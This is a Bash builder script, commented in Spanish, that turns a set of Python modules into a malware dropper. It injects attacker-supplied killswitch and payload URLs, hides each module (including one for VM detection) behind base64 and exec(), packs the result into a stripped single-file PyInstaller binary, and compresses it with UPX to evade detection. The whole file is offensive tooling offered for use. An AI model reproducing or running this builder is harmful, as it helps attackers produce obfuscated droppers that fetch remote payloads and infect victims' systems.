#!/usr/bin/env bash
# builder — Configura, ofusca y compila el dropper.
# Uso: ./builder <killswitch_url> <payload_url>

set -euo pipefail

if [ "$#" -ne 2 ]; then
    echo "Uso: $0 <killswitch_url> <payload_url>"
    exit 1
fi

KILLSWITCH_URL="$1"
PAYLOAD_URL="$2"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
WORK_DIR="$(mktemp -d)"
BINARY_NAME="dropper"

echo "[*] Copiando fuentes a directorio temporal: $WORK_DIR"
cp "$SCRIPT_DIR/dropper.py"    "$WORK_DIR/"
cp "$SCRIPT_DIR/killswitch.py" "$WORK_DIR/"
cp "$SCRIPT_DIR/vm_detect.py"  "$WORK_DIR/"
cp "$SCRIPT_DIR/payload.py"    "$WORK_DIR/"

# 1. Inyectar URLs
echo "[*] Inyectando configuración..."
sed -i \
    -e "s|KILLSWITCH_URL_PLACEHOLDER|${KILLSWITCH_URL}|g" \
    -e "s|PAYLOAD_URL_PLACEHOLDER|${PAYLOAD_URL}|g" \
    "$WORK_DIR/dropper.py"

# 2. Ofuscación: wrapper base64
python3 - "$WORK_DIR" << 'PYEOF'
import base64, os, sys
work_dir = sys.argv[1]
for mod_file in ["killswitch.py", "vm_detect.py", "payload.py", "dropper.py"]:
    path = os.path.join(work_dir, mod_file)
    with open(path, "rb") as f:
        src = f.read()
    encoded = base64.b64encode(src).decode()
    mod_name = mod_file.replace(".py", "")
    wrapper = (
        f"import base64\n"
        f"_s = base64.b64decode('{encoded}')\n"
        f"exec(compile(_s, '<{mod_name}>', 'exec'))\n"
    )
    with open(path, "w") as f:
        f.write(wrapper)
    print(f"  [+] {mod_file} ofuscado")
PYEOF

# 3. Instalar dependencias
echo "[*] Instalando dependencias..."
pip install --quiet requests pyinstaller 2>/dev/null || \
pip install --quiet --break-system-packages requests pyinstaller

# 4. Compilar con PyInstaller
echo "[*] Compilando binario nativo con PyInstaller..."
cd "$WORK_DIR"
python3 -m PyInstaller \
    --onefile \
    --name "$BINARY_NAME" \
    --distpath "$SCRIPT_DIR" \
    --workpath "$WORK_DIR/build" \
    --specpath "$WORK_DIR" \
    --hidden-import requests \
    --hidden-import urllib.request \
    --hidden-import ctypes \
    --hidden-import mmap \
    --hidden-import killswitch \
    --hidden-import vm_detect \
    --hidden-import payload \
    --collect-all certifi \
    --collect-all requests \
    --strip \
    --log-level WARN \
    "$WORK_DIR/dropper.py"

# 5. Comprimir con UPX si está disponible
if command -v upx &>/dev/null; then
    echo "[*] Comprimiendo con UPX..."
    upx --best "$SCRIPT_DIR/$BINARY_NAME" 2>/dev/null || true
fi

# 6. Limpieza
rm -rf "$WORK_DIR"
rm -f "$SCRIPT_DIR/dropper.spec"
echo "[+] Binario generado en: $SCRIPT_DIR/$BINARY_NAME"
